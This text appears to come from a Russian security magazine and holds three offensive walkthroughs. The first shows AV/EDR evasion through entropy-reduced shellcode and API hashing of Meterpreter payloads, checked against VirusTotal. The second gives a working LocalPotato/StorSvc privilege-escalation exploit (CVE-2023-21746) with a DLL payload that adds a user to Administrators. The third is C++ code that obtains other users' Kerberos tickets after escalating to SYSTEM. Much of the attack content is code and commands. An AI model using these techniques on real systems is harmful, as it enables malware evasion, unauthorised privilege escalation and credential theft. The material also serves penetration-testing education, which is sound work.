



                     Запуск EntropyReducer




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





        ИЗУЧАЕМ ИНСТРУМЕНТЫ ОБХОДА
                 АНТИВИРУСОВ И EDR




Те перь обнаруже ние значительно ниже.





                    Подсчет энтро пии файла





                 Резуль таты проверки на VirusTotal

Вот так выглядит изменен ный шелл-код с уменьшен ной энтро пией:


unsignedcharentropy_bin_ER[] = {
0x68, 0xc0, 0xa8, 0x8d, 0x00, 0x2f, 0x00, 0x00, 0x00, 0x01, 0x00,
0x00,
0x29, 0x00, 0x2b, 0x00, 0x00, 0x00, 0x04, 0x56, 0x57, 0x68, 0x00,
0x3d,
...
0x00, 0x00, 0x00, 0x8b, 0x58, 0x24, 0x01, 0x00, 0x1b, 0x00, 0x00,
0x00,
0xbb, 0xf0, 0xb5, 0xa2, 0x00, 0x56, 0x00, 0x00, 0x00};
unsigned int entropy_bin_ER_len = 801;

Этот код мы можем ском пилировать в .exe. После чего уже не сос тавит труда
запустить его, как обычный исполняемый файл.


ÏÐÈÌÅÍßÅÌ API HASHING

API Hashing — это техника, которую раз работчики вредонос ного ПО при меня-
ют, что бы скрыть подоз рительные вызовы Windows API от таб лицы импорта
адресов портатив ного исполняемого фай ла (PE). Это затрудняет анализ, пос-
кольку становит ся сложнее опре делить, какие функции вызываются.


Êàê ýòî ðàáîòàåò?
Проблема для разработчиков вредонос ного ПО: если есть PE с непов-
режденной IAT (Import Address Table), легко понять, каковы воз можнос ти PE.
Нап ример, если видно, что двоичный файл загружает Ws2_32.dll, можно
предположить, что он имеет сетевые воз можнос ти.
   Чтобы усложнить первоначальный анализ PE, вирусо писа тели скрывают
подозрительные вызовы API от IAT с помощью API-хеширования. Таким обра-
зом, когда аналитик запустит вредонос ный двоичный файл через утилиту
strings или откроет его в PE-парсере, подозритель ные Windows API будут
скрыты.


Ïðèìåð îáõîäà
Предположим, у нас есть вре доносное ПО, которое использует функцию
CreateThread. Если мы скомпилируем код и проанализируем его с помощью
PE-парсера, увидим, что CreateThread — одна из импортированных фун-
кций. Однако если мы применим технику API Hashing, то CreateThread
исчезнет из IAT.
  Для это го разработчики вредоносного ПО могут использовать сле дующий
под ход:
 1. Соз дается хеш-функция, которая при нима ет имя функции (например,
  CreateThread) и воз вра щает уникальное хеш-значение.
 2. Вре донос ное ПО во время выполнения переби рает все экспортирован-
  ные функции из биб лиотеки (нап ример, kernel32.dll), вычис ляет их
  хеши и срав нивает с хешем CreateThread.
 3. Как толь ко хеш совпадает, вредонос ное ПО получа ет адрес функции
   и может вызвать ее нап рямую, минуя IAT.

Рассмот рим под робнее. Как мы должны получить хеш от вызова API?
   У нас есть при мер алго ритма хеширования, который может пре обра зовать
любую функцию в хеш:


$APIsToHash = @("VirtualAlloc")
$APIsToHash | % {
 $api = $_
 $hash = 0x35
 [int]$i = 0
 $api.ToCharArray() | % {
  $l = $_
  $c = [int64]$l
  $c = '0x{0:x}' -f $c
  $hash += $hash * 0xab10f29f + $c -band 0xffffff
  $hashHex = '0x{0:x}' -f $hash
  $i++
  write-host "Iteration $i : $l : $c : $hashHex"
 }
 write-host "$api`t $('0x00{0:x}' -f $hash)"
}

За осно ву для хеширования мы взяли фун кцию VirtualAlloc. Она позволяет
зарезервировать опре делен ный объем памяти.





                 Преобразование функции в хеш

Проблема толь ко в том, что шелл Meterpreter дела ет вызов ко множеству API,
включая ExitProcess, LoadLibraryA, VirtualAlloc и VirtualFree. И это
далеко не полный список. Что же нам делать? Здесь помога ет Randomise-api-
hashes-cobalt-strike. Этот скрипт вычис ляет хеши для огромного множес тва
API и заменяет их названия в шелл-коде. Давай уста новим его на Kali Linux
и пос мотрим, как он работа ет.
   Клонируем репози торий.





                     Кло нирование репозитория

Ге нери руем шелл-код в сыром виде и записы ваем в файл с расширением
.bin.




                     Инстру мент принимает на вход только .bin!





                        Генерация шелл-кода

И наконец, напустим инструмент на le.bin.





         Запуск инструмента Randomise-api-hashes-cobalt-strike

Заметил цифру 64 пос ле названия скрип та? Это мы прописы ваем архитек-
туру. Разная разрядность — разные вызовы API. После отра ботки мы получа-
ем файл file.bin_0xf9.bin. Если понадо бится получить шелл-код в сыром
виде (С-code), то вновь используем xxd.





                 Получение шелл-кода в С-code

А что по обна руже ниям?
    VirusTotal дал 11 из 69.





                 Резуль таты проверки на VirusTotal

И решения из списка исследуемых не дали отрицательный результат.





                     Резуль таты обнаруже ния

Этот шелл-код уже можно скомпилировать в .exe.





                     Шелл-код для компиляции




                     Под робнее о технике API Hashing читай в статье
                            «Веселые хеши. Реализуем тех нику API Hashing,
                         что бы обдурить антивирус».



ÂÛÂÎÄÛ

Хотя на сегод няшний день AV/EDR-решения исполь зуют для выявления ано-
мальных действий самые передовые тех нологии, включая машинное обу-
чение, поведен ческую аналити ку и прочее, они пока не стали панаце ей
от киберугроз. Мы рассмотрели нес колько методов, некоторые из них пока
актуальны и позволяют обойти анти вирусные решения. Все это важно учи-
тывать сот рудникам ком паний, отвечающих за защиту ресурсов и предотвра-
щение реализации киберуг роз.
COVERSTORY





В этой статье речь пойдет об уяз вимости,
позволяющей    выполнить    локальное
повыше ние привилегий (LPE) в операци-
онных системах семейства Windows. Баг
напрямую связан с NTLM-аутен тифика цией,               trazzz0rd                                                                                      Пентестер Лаборатории
поэто му сначала погово рим о том, как она       инновационных технологий                                                                                  и кибербезопасности
устро ена, а потом перейдем непосредс-            AP Security
твенно к раз бору CVE-2023-21746.


NTLM-ÀÓÒÅÍÒÈÔÈÊÀÖÈß





Предположим, поль зователь хочет получить дос туп к фай ловому ресурсу
на другом компьюте ре или сервере. Аутентификация выпол няет ся в четыре
эта па:
 1. Пользователь отправляет серверу запрос с име нем учетной записи.
 2. В ответ сервер отправляет ему случай ное число, называемое challenge.
 3. Пользователь шиф рует это число своим NT-хешем и отправляет обратно.
 4. Сер вер извлекает из SAM (Security Account Manager — RPC-сер вер
   Windows, опе рирующий базой данных учетных записей) хеш пользовате ля
   и про делывает те же самые действия, что и пользователь, срав нивая
   полученные хеши. Если результаты совпали, то аутентификация считается
   успешной.


ËÎÊÀËÜÍÀß ÀÓÒÅÍÒÈÔÈÊÀÖÈß NTLM

Рассмот рим локальную аутентифика цию NTLM, которая начинается с аутен-
тификации пользовате ля на самой машине.





Эта аутентифика ция выполняет ся следующим образом:
 1. Пользователь вводит свои учет ные дан ные, логин и пароль, при входе
   на машину.
 2. Вве денные данные передаются подсистеме локальной безопасности LSA,
   которая пре образует пароль в хеш.
 3. Далее LSA передает имя пользователя SAM, который извлекает хеш ука-
   занного пользовате ля.
 4. LSA све ряет хеши, и если они совпадают, то поль зователь получает дос туп
   к машине.

Далее срабаты вает рассмотренный выше механизм, основанный на модели
клиент — сер вер.
  Ло кальная аутен тификация NTLM — это частный случай, она применяется,
когда кли ент ская и серверная час ти работа ют на одной машине.
   Клиент получает учетные данные вошед шего в систему пользователя
и создает зап рос, содержащий имя рабочей станции и домена клиента.





Сообще ние типа 1. Кли ент посылает это сооб щение для начала соеди нения.
Оно используется для согласования параметров аутентифика ции, как и рань-
ше, но также содержит имя кли ентской машины и ее домен. Сер вер может
про верить имя и домен кли ента, и, если они совпадают с его собс твенными,
начинается процесс локальной аутентификации.
  Сообщение типа 2. Сервер создает контекст безопасности, вызывая фун-
кцию AcceptSecurityContext (NTLM), и в этом сооб щении отправляет кли-
енту его идентификатор. Затем кли ент может исполь зовать идентификатор
контекста безопасности, чтобы связать себя с соединением.
  Сообщение  3-го  типа.  Клиент  получает  токен  и  переда ет  его
в InitializeSecurityContext (NTLM). Если InitializeSecurityContext
(NTLM) возвращает SEC_E_OK,  то взаимная  аутентифика ция завер шена
и можно начинать защищен ный сеанс. Если же он воз вра щает код ошибки, то
перего воры о вза имной аутентификации завершаются. В противном слу чае
токен безопасности, возвра щенный InitializeSecurityContext  (NTLM),
отправ ляет ся клиенту и шаги 2 и 3 повторяются.


ÊÀÊ ÐÀÁÎÒÀÅÒ LOCALPOTATO

LocalPotato использует недостаток в механиз ме локальной аутентификации
NTLM. Экс пло ит обманывает привилегиро ванный процесс и заставляет
аутентифицировать сеанс, запущенный хакером. В результате атакующий
получает соеди нение, предоставляющее ему дос туп к любым ресур сам
с привилегиями обма нуто го процесса.
   «Картошка» работает следующим образом:
 1. Хакер запускает при вилегирован ный процесс для подключения к подкон-
   троль ному ему сер веру. В принципе, это работа ет ана логично предыду-
  щим Potato, когда неп ривилегирован ный пользователь заставлял ОС соз-
   давать соединения, использующие права SYSTEM.
 2. Сер вер на машине соз даст контекст безопасности А для привилегирован-
   ного соеди нения, но не будет отправлять его сра зу. Хакер запустит свой
   кли ент, чтобы он одновременно с локальным иницииро вал соединение
   с сервером. Легитимный клиент отправляет сооб щение, чтобы ини цииро-
   вать соединение, а сервер в ответ пошлет сооб щение с идентификатором
   нового контекста безопасности Б.
 3. Злоумышленник так же запус кает свой сервер и меняет идентифика торы
   кон текстов обоих соединений таким образом, что бы привилегированный
   процесс получил контекст соединения с сер вером злоумышленни ка, а не
   со своим собственным. В результате хакер сможет получить доступ
   к любому сетево му ресурсу с привилегиями SYSTEM.





STORSVC È DLL HIJACKING

До  сих пор мы использовали  LocalPotato  для записи любых фай лов
на целевую машину. Чтобы получить привилегиро ванную оболочку, нам нуж но
выяснить, как исполь зовать произволь ную запись для выполнения команды.
  Недавно был обнаружен еще один вектор повышения при виле гий, ког да
злоумышленник мог перехватить отсутс твующую DLL для выполнения про-
извольных команд с привилегиями SYSTEM. Единственная проблема этого
вектора заключалась в том, что для его запуска злоумышленни ку необходимо
было записать DLL в сис темную переменную PATH. По умолчанию в PATH
Windows вклю чаются только те катало ги, в которые могут писать лишь при-
вилегированные учет ные записи. Хотя мож но найти машины, на которых уста-
новка определенных приложений изменила переменную PATH и сделала
машину уязвимой, век тор атаки при меним толь ко к конкретным сце нариям.
Комбиниро вание данной ата ки с LocalPotato позволя ет преодолеть это огра-
ниче ние и получить полностью рабочий эксплоит для повышения привиле гий.
   Как выяснила ком пания BlackArrow, злоумыш ленник может отправить RPC-
вызов  методу  SvcRebootToFlashingMode,  предос тавляемо му  службой
StorSvc, что, в свою очередь, приведет к попыт ке загрузки отсутствующей
DLL под названием SprintCSP.dll.





Ес ли ты нез наком с RPC, то счи тай, что это API, который раскры вает функции
для удаленного использования. В опи санном случае служба StorSvc раскры-
вает метод SvcRebootToFlashingMode, который может выз вать любой
человек, име ющий доступ к машине.
  Поскольку  StorSvc  работает  с  при вилегиями  SYSTEM,  создание
SprintCSP.dll где-нибудь в PATH приведет к заг рузке биб лиотеки при каж-
дом вызове SvcRebootToFlashingMode.


ÊÎÌÏÈËßÖÈß ÝÊÑÏËÎÈÒÀ

Те перь, когда мы зна ем всю теоретическую базу, мы можем прис тупить
к выполнению практической час ти. Все необ ходимое для дальнейших дей-
ствий можно най ти в ре пози тории на GitHub.
   Чтобы вос поль зовать ся эксплоитом CVE-2023-21746, сначала надо ском-
пилиро вать два файла:
 • SprintCSP.dll. Это недостающая DLL, которую мы собираемся перех-
   ватить. Код по умолчанию, поставляемый с эксплоитом, выполняет коман-
   ду whoami и выводит ответ в C:\Program Data\whoamiall.txt. Нам
   нужно изме нить коман ду, чтобы достигнуть нашей цели;
 • RpcClient.exe.     Эта     программа     запус тит     RPC-вызов
  SvcRebootToFlashingMode.  В  зависимос ти  от  вер сии  Windows,
   на которую нацелен экспло ит, его код может потребоваться немного под-
   править, посколь ку в раз ных версиях Windows используются разные иден-
   тификаторы интерфей сов для рас крытия SvcRebootToFlashingMode.

Для начала разберемся с файлом RpcClient.exe. Как уже говорилось, нам
пот ребуется изме нить эксплоит в зависимости от версии Windows на целевой
машине. Для это го нуж но отредактировать пер вые строки файла C:\tools\
LPE via StorSvc\RpcClient\RpcClient\storsvc_c.c так, чтобы выбира-
лась нужная опе раци онная система. Поскольку моя машина работает
под управлением Windows Server 2019, я отредактирую файл следующим
образом.





Это настроит  экспло ит на использование корректного идентификатора
интерфейса RPC для моей версии Windows. Теперь, когда код исправлен,
ском пилируем необходимые нам инс трумен ты.





Пе ред компиляцией SprintCSP.dll нам нужно изменить функцию DoStuff()
в фай ле SprintCSP\main.c таким обра зом, что бы она добавляла нашего
текуще го поль зователя в группу Administrators. Вот код с нашей заменен-
ной командой:


void DoStuff() {


    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net
localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\
Windows", &si, &pi);


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);


    return;
}





Те перь ском пилируем нашу DLL.





ÝÊÑÏËÓÀÒÀÖÈß

Для начала удос товеримся, что наш пользователь действи тельно не входит
в группу локальных администраторов.





Для успешной эксплуатации StorSvc необ ходимо скопировать SprintCSP.
dll в любую дирек торию текущей PATH. Про верить PATH мож но, выполнив
следующую команду:


reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\
Environment" -v Path





Мы будем использовать каталог %SystemRoot%\system32, который расширя-
ется до C:\windows\system32. Однако ты можешь использовать любой
из этих двух катало гов.
   Те перь, когда все готово, можем запус тить LocalPotato:


LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll





DLL  успешно  записалась  в  System32!  Теперь мы можем  запустить
RpcClient.exe для запуска вызова SvcRebootToFlashingMode, выполнив
полез ную нагрузку в нашей DLL.




Что бы удостовериться, что экспло ит сработал, про верим, находится ли наш
поль зователь в груп пе администраторов.





ÂÛÂÎÄ

Пос ле успешного срабаты вания экспло ита мы можем выполнить любые дей-
ствия от лица администратора под учет ной записью пользователя user. Нап-
ример, запус тить командную стро ку.





Оп тимальная защита от экс плуатации этой уяз вимости (как и других подоб-
ных) — сво евременно уста навливать обновления безопасности Microsoft.
Тем не менее даже в этом случае некоторые про токолы, использующие NTLM
в качестве метода аутентификации, могут быть уяз вимы для подобных атак.
COVERSTORY





Есть разные способы зло употреблять сес-
сией пользователя на устройстве: кра жа
учетных данных, манипуляции с токенами
и другие. Но знаешь ли  ты, что можно
сымитировать получение TGT-билета поль-         MichelleVermishelle                                                                                       @Michaelzhm
зователем через совершенно легитимные        michael.zhmailo@yandex.ru
фун кции Windows?




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


В этом году появи лось несколько новых способов из такого разряда. Наибо-
лее интересные — WTSImpersonator и GIUDA. Пос ледний позволяет получать
тикеты залоги ненного пользователя, даже не зная его пароля! Давай раз-
берем ся, как это работает, а параллельно напишем реали зацию на C++,
которую я назвал TGSThief.


LOGON SESSION

При вхо де поль зовате ля в Windows появляет ся сес сия пользователя, которая
хранит все дан ные о нем. Для каждого нового пользовате ля создается новая
сессия. Например, если на компьютере одновре менно работают два поль-
зователя, то будет две сес сии.





                      Как выглядят Logon Sessions

Каж дая сессия опре деляется с помощью LUID  (locally unique  identier).
Из названия понятно, что LUID уникален для каждой сессии. Информация
хранится в виде одноименной структуры.


typedef struct _LUID {
  ULONG LowPart;
  LONG  HighPart;
} LUID, *PLUID;

Сам LUID представ лен в виде двух зна чений: ULONG и LONG. При чем обычно
запол няется лишь поле LowPart, а HighPart имеет значение 0.
   Эта струк тура используется во всех фун кциях WinAPI, которые так или ина-
че связаны с сессиями пользователя.
  С помощью GetTokenInformation() можно получить LUID пользователя.
Для этого функции сле дует передать токен процес са, запущенного от имени
текуще го поль зователя.


#include <windows.h>
#include <iostream>
#include <sddl.h>


int main() {
  HANDLE tokenHandle;


  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &
tokenHandle)) {
    std::cerr << "Ошибка OpenProcessToken: " << GetLastError() << std
::endl;
    return 1;
  }


  DWORD tokenInformationLength = 0;
  GetTokenInformation(tokenHandle, TokenStatistics, nullptr, 0, &
tokenInformationLength);
  if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    std::cerr << "GetTokenInformation неудачный первый вызов: " <<
GetLastError() << std::endl;
    CloseHandle(tokenHandle);
    return 1;
  }


  TOKEN_STATISTICS* tokenStats = reinterpret_cast<TOKEN_STATISTICS*>(
new BYTE[tokenInformationLength]);
  if (tokenStats == nullptr) {
    std::cerr << "Ошибка выделения памяти для TOKEN_STATISTICS" <<
std::endl;
    CloseHandle(tokenHandle);
    return 1;
  }


  if (!GetTokenInformation(tokenHandle, TokenStatistics, tokenStats,
tokenInformationLength, &tokenInformationLength)) {
    std::cerr << "Ошибка GetTokenInformation: " << GetLastError() <<
std::endl;
    delete[] tokenStats;
    CloseHandle(tokenHandle);
    return 1;
  }


  std::cout << "LUID: " << std::hex << "0x" << std::uppercase <<
tokenStats->AuthenticationId.LowPart << tokenStats->AuthenticationId.
HighPart << std::endl;


  delete[] tokenStats;
  CloseHandle(tokenHandle);


  return 0;
}

Информация о LUID пользователя упа дет в поле AuthenticationId струк-
туры TOKEN_STATISTICS.


typedef struct _TOKEN_STATISTICS {
  LUID             TokenId;
  LUID             AuthenticationId;
  LARGE_INTEGER        ExpirationTime;
  TOKEN_TYPE           TokenType;
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
  DWORD            DynamicCharged;
  DWORD            DynamicAvailable;
  DWORD            GroupCount;
  DWORD            PrivilegeCount;
  LUID             ModifiedId;
} TOKEN_STATISTICS, *PTOKEN_STATISTICS;

Именно на манипуляциях с LUID основана логика инструмента GIUDA. Фак-
тически идет под мена LUID, что открывает возможность запросить билет
от лица пользовате ля, чья сес сия просто присутс твует на устройстве. Свой
LUID мы получать научились, а как получать LUID других пользовате лей?
  Конечно, можем перечислить все про цес сы, зап росить токен каждого про-
цесса, извлечь LUID, но это неудоб но. Поэто му следует использовать фун-
кцию LsaEnumerateLogonSessions().


NTSTATUS LsaEnumerateLogonSessions(
  [out] PULONG LogonSessionCount,
  [out] PLUID  *LogonSessionList
);

 • LogonSessionCount — в этом парамет ре вер нется количество сессий
   в системе;
 • LogonSessionList — в этом параметре будет список LUID сессий
   на системе.

Вот пример перечисления всех сессий в системе:


#include <windows.h>
#include <ntsecapi.h>
#include <iostream>
#include <locale.h>
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


#pragma comment(lib, "Secur32.lib")


int main() {
  setlocale(LC_ALL, "");
  ULONG logonSessionCount = 0;
  PLUID logonSessionList = nullptr;


  NTSTATUS status = LsaEnumerateLogonSessions(&logonSessionCount, &
logonSessionList);
  if (status != STATUS_SUCCESS) {
    std::cerr << "Ошибка LsaEnumerateLogonSessions: " << status <<
std::endl;
    return 1;
  }


  std::cout << "Количество сеансов входа в систему: " <<
logonSessionCount << std::endl;
  for (ULONG i = 0; i < logonSessionCount; ++i) {
    std::cout << "Сеанс №" << i + 1 << std::endl;
    std::cout << "LUID: " << std::hex << "0x" << std::uppercase <<
logonSessionList[i].LowPart << logonSessionList[i].HighPart << std::
endl;
    std::cout << std::endl;
  }


  LsaFreeReturnBuffer(logonSessionList);


  return 0;
}





                 Ре зультат выполнения прог раммы

К сожале нию, из одного LUID не очень понятно, что пред став ляет собой эта
сессия. Хотелось бы получить хотя бы имя пользователя. Для этого применя-
ется функция LsaGetLogonSessionData().


NTSTATUS LsaGetLogonSessionData(
  [in]  PLUID            LogonId,
  [out] PSECURITY_LOGON_SESSION_DATA *ppLogonSessionData
);

Фун кция принимает LUID, информацию о котором нужно получить, а возвра-
щает структуру SECURITY_LOGON_SESSION_DATA.


typedef struct _SECURITY_LOGON_SESSION_DATA {
  ULONG           Size;
  LUID            LogonId;
  LSA_UNICODE_STRING    UserName;
  LSA_UNICODE_STRING    LogonDomain;
  LSA_UNICODE_STRING    AuthenticationPackage;
  ULONG           LogonType;
  ULONG           Session;
  PSID            Sid;
  LARGE_INTEGER       LogonTime;
  LSA_UNICODE_STRING    LogonServer;
  LSA_UNICODE_STRING    DnsDomainName;
  LSA_UNICODE_STRING    Upn;
  ULONG           UserFlags;
  LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
  LSA_UNICODE_STRING    LogonScript;
  LSA_UNICODE_STRING    ProfilePath;
  LSA_UNICODE_STRING    HomeDirectory;
  LSA_UNICODE_STRING    HomeDirectoryDrive;
  LARGE_INTEGER       LogoffTime;
  LARGE_INTEGER       KickOffTime;
  LARGE_INTEGER       PasswordLastSet;
  LARGE_INTEGER       PasswordCanChange;
  LARGE_INTEGER       PasswordMustChange;
} SECURITY_LOGON_SESSION_DATA, *PSECURITY_LOGON_SESSION_DATA;

В этой структуре — мас са информации о поль зовате ле: имя юзе ра, пакет
аутентификации, через который он прошел проверку, и его флаги. Подробно
с опи сани ем каждого эле мен та структуры можешь озна комиться в до кумен-
тации. Нас же будут инте ресо вать поля LogonDomain и UserName. Следующая
функция поз воля ет извлечь их, при нима ет только LUID.


std::wstring GetUserNameFromLogonId(LUID LogonId)
{
  PSECURITY_LOGON_SESSION_DATA pSessionData = NULL;
  if (LsaGetLogonSessionData(&LogonId, &pSessionData) != 0) {
    return L"";
  }


  std::wstring domainName(pSessionData->LogonDomain.Buffer,
pSessionData->LogonDomain.Buffer + wcslen(pSessionData->LogonDomain.
Buffer));
  std::wstring userName(pSessionData->UserName.Buffer, pSessionData->
UserName.Buffer + wcslen(pSessionData->UserName.Buffer));
  LsaFreeReturnBuffer(pSessionData);


  return domainName + L"\" + userName;
}

Вот полный код программы с изме нениями:


#include <windows.h>
#include <ntsecapi.h>
#include <iostream>
#include <locale.h>
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


#pragma comment(lib, "Secur32.lib")


std::wstring GetUserNameFromLogonId(LUID LogonId)
{
  PSECURITY_LOGON_SESSION_DATA pSessionData = NULL;
  if (LsaGetLogonSessionData(&LogonId, &pSessionData) != 0) {
    return L"";
  }


  std::wstring domainName(pSessionData->LogonDomain.Buffer,
pSessionData->LogonDomain.Buffer + wcslen(pSessionData->LogonDomain.
Buffer));
  std::wstring userName(pSessionData->UserName.Buffer, pSessionData->
UserName.Buffer + wcslen(pSessionData->UserName.Buffer));
  LsaFreeReturnBuffer(pSessionData);


  return domainName + L"\" + userName;
}


int main() {
  setlocale(LC_ALL, "");
  ULONG logonSessionCount = 0;
  PLUID logonSessionList = nullptr;


  NTSTATUS status = LsaEnumerateLogonSessions(&logonSessionCount, &
logonSessionList);
  if (status != STATUS_SUCCESS) {
    std::cerr << "Ошибка LsaEnumerateLogonSessions: " << status <<
std::endl;
    return 1;
  }


  std::cout << "Количество сеансов входа в систему: " <<
logonSessionCount << std::endl;
  for (ULONG i = 0; i < logonSessionCount; ++i) {
    std::cout << "Сеанс №" << i + 1 << std::endl;
    std::wcout << L"LUID: " << std::hex << L"0x" << std::uppercase <
< logonSessionList[i].LowPart << logonSessionList[i].HighPart << L"
" << GetUserNameFromLogonId(logonSessionList[i]) << std::endl;
    std::cout << std::endl;
  }


  LsaFreeReturnBuffer(logonSessionList);


  return 0;
}





                 Ре зультат выполнения прог раммы

Отлично! Как выглядят сес сии, мы разобрались. Теперь пора показать,
как запрашиваются билеты Kerberos самой LSA. Это поможет нам под менить
LUID и получить чужой тикет.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





       ПОЛУЧАЕМ БИЛЕТЫ TGT МЕТОДОМ
                                GIUDA





ÊÀÊ LSA ÇÀÏÐÀØÈÂÀÅÒ ÁÈËÅÒÛ KERBEROS

Для запроса TGS-билета LSA получает SPN (service principal name, иден-
тификатор службы) и переда ет на KDC. Мы можем зап рашивать билеты TGS
сами. Для это го есть функция LsaCallAuthenticationPackage().


NTSTATUS LsaCallAuthenticationPackage(
  [in]  HANDLE  LsaHandle,
  [in]  ULONG   AuthenticationPackage,
  [in]  PVOID   ProtocolSubmitBuffer,
  [in]  ULONG   SubmitBufferLength,
  [out] PVOID   *ProtocolReturnBuffer,
  [out] PULONG  ReturnBufferLength,
  [out] PNTSTATUS ProtocolStatus
);

Здесь
 • LsaHandle —  хендл,  указывающий на служ бу LSA, который можно
   получить с помощью LsaRegisterLogonProcess() или LsaConnectUntrusted();
 • AuthenticationPackage — номер AP, с которым следует взаимо дей-
   ствовать;
 • ProtocolSubmitBuffer — переда ваемый буфер, мы будем отдавать
  KERB_RETRIEVE_TKT_REQUEST;
 • SubmitBufferLength — размер передаваемого буфера;
 • ProtocolReturnBuffer — ответ от AuthenticationPackage . Нам
   прилетит структура KERB_RETRIEVE_TKT_RESPONSE;
 • ReturnBufferLength — размер буфера с ответом;
 • ProtocolStatus — зна чение, которое будет содержать код ошиб ки
   от AP.

Итак, как запол нить KERB_RETRIEVE_TKT_REQUEST, чтобы получить билет
TGS? Струк тура выглядит вот так:


typedef struct _KERB_RETRIEVE_TKT_REQUEST {
  KERB_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID             LogonId;
  UNICODE_STRING       TargetName;
  ULONG            TicketFlags;
  ULONG            CacheOptions;
  LONG             EncryptionType;
  SecHandle          CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;

Здесь
 • MessageType —  то,  что  нам  нужно  получить  от  AP.  Указыва ем
  KerbRetrieveEncodedTicketMessage;
 • LogonID — LUID сессии, от лица которой происходит обращение к AP.
  Именно в этот момент и будет под менен LUID. Проблема в том, что если
  мы под клю чились  к LSA через LsaConnectUntrusted() , то  у нас
   не получится указать здесь LUID чужой сес сии — LSA выдаст ошиб ку 0x5
  ERROR_ACCESS_DENIED ,   но   если   мы   под ключимся    через
  LsaRegisterLogonProcess() ,  то сможем переда вать сюда любой
   желанный LUID. И таким обра зом смо жем запрашивать билеты из чужой
   сессии;
 • TargetName — здесь указываем SPN службы, на которую нуж но получить
   билет;
 • CacheOptions — опции, связанные с кешем LSA. Кеш LSA — это некое
   хранилище, в котором лежат билеты. Здесь тоже есть некоторые особен-
   ности. Если мы сразу укажем KERB_RETRIEVE_TICKET_AS_KERB_CRED
   (значение для получе ния билета в форме KRB_CRED, сразу с сессион ным
   клю чом; под робнос ти — в другой моей статье), то есть шанс не получить
   билет. Проблема в том, что в кеше LSA может не быть билета для той служ-
   бы,  на  которую мы  хотим  сходить. И  если мы  сразу  ука зываем
  KERB_RETRIEVE_TICKET_AS_KERB_CRED, то LSA может прос то не вер-
   нуть никакого билета, поскольку возвра щать нечего. Поэтому придется
   дважды вызвать функцию LsaCallAuthenticationPackage() . Первый
   раз — со значени ем KERB_RETRIEVE_TICKET_DEFAULT, второй —
   с  KERB_RETRIEVE_TICKET_AS_KERB_CRED.  ...DEFAULT  отвечает
   за зап рос билета. То есть про сим LSA обратиться к KDC и получить билет;
 • EncryptionType — жела емый  тип шифрования для запрошенного
   билета. Ука зыва ем KERB_ETYPE_DEFAULT — нам не принципиален тип
  шифрования;
 • CredentialsHandle — используется для SSPI, в данном случае неваж-
   но.


ÊÐÀÄÅÌ ÁÈËÅÒ

Мы разобрались с тем, как работает зап рос билетов Kerberos на локальной
системе. Пора перехо дить к экс плуатации! Полный исходный код проекта
можешь пос мотреть в моем репозитории.
  Сначала мы перечисляем все имеющиеся сес сии, для этого я соз дал фун-
кцию LogonInfo(). Она при нимает ука затель на структуру LUID, которая
будет проини циали зирована нужной сессией. Фак тичес ки — у какого поль-
зователя нужно стащить билет. Ну или не «ста щить», а получить новый, абсо-
лютно све жий и чистый билет для каждого пользовате ля.


BOOL LogonInfo(LUID* LogonSession)
{
  std::vector<LUID> logonIds;
  PLUID sessions;
  ULONG sessionCount;
  if (LsaEnumerateLogonSessions(&sessionCount, &sessions) != 0) {
    return FALSE;
  }


  for (ULONG i = 0; i < sessionCount; ++i) {
    logonIds.push_back(sessions[i]);
  }


  LsaFreeReturnBuffer(sessions);


  for (size_t i = 0; i < logonIds.size(); ++i) {
    std::wcout << L"\t[!] Index: " << i << L", Logon ID: " << to_hex(
logonIds[i].LowPart) << ", Username: " << GetUserNameFromLogonId(
logonIds[i]) << '\n';
  }


  size_t index;
  std::cout << "\n[?] Enter index of logon session: ";
  std::cin >> index;


  if (index < logonIds.size()) {
    LUID selectedLogonId = logonIds[index];
    *LogonSession = selectedLogonId;
    return TRUE;
  }
  else {
    return FALSE;
  }
  return FALSE;
}





                    При мер работы функции

Следующим    шагом    подклю чаем ся     к    LSA    с    помощью
LsaRegisterLogonProcess(), чтобы передать LUID чужой сессии. Для вызова
этой функции нуж на привилегия SeTcbPrivilege. Ей обладает только учетная
запись системы. При вилегию, конечно, можно наз начить и руками через GPO
или с помощью Privileger.





              До бавление при вилегии SeTcbPrivilege

Чувствуешь, что это несколько неудоб но? Поэтому я добавил в код простей-
ший алгоритм для повыше ния привилегий до учетной записи системы. Здесь
все стандартно:
 1. Получа ем             при вилегии            SeDebugPrivilege
   и SeImpersonatePrivilege.
 2. Получа ем токен про цесса, запущенного от лица системы. Я получаю токен
   с Winlogon.
 3. Применяем    токен     к    нашей    программе    с   помощью
  ImpersonateLoggedOnUser() .

Код я выделил в отдельный файл getsystem.cpp.
   Те перь у нас есть при вилегия SeTcbPrivilege, так как ей обладает учет-
ная    запись    сис темы.    Следующим    шагом    с    помощью
LsaLookupAuthenticationPackage() получаем номер AP Kerberos.
  Наконец у нас есть хендл, LUID и номер AP Kerberos. Пора ломать!
  Для этого я написал отдельную функцию AskTgs(). Она принимает все эти
данные.


BOOL AskTgs(HANDLE hLsa, ULONG AP, LUID logonId, LPCWSTR szTarget,
LUID originaLuid) {
  ...
}

